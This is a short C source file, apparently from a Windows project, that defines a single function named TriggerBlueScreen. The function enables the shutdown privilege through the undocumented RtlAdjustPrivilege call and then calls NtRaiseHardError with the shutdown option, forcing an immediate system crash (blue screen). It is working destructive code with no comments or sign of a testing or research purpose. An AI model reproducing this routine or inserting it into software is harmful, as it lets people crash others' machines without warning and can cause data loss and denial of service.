#include "Win32Libs.h"
#include "BlueScreen.h"

VOID TriggerBlueScreen()
{
	BOOLEAN PrivilegeState = FALSE;
	ULONG ErrorResponse = 0;
	RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &ErrorResponse);
}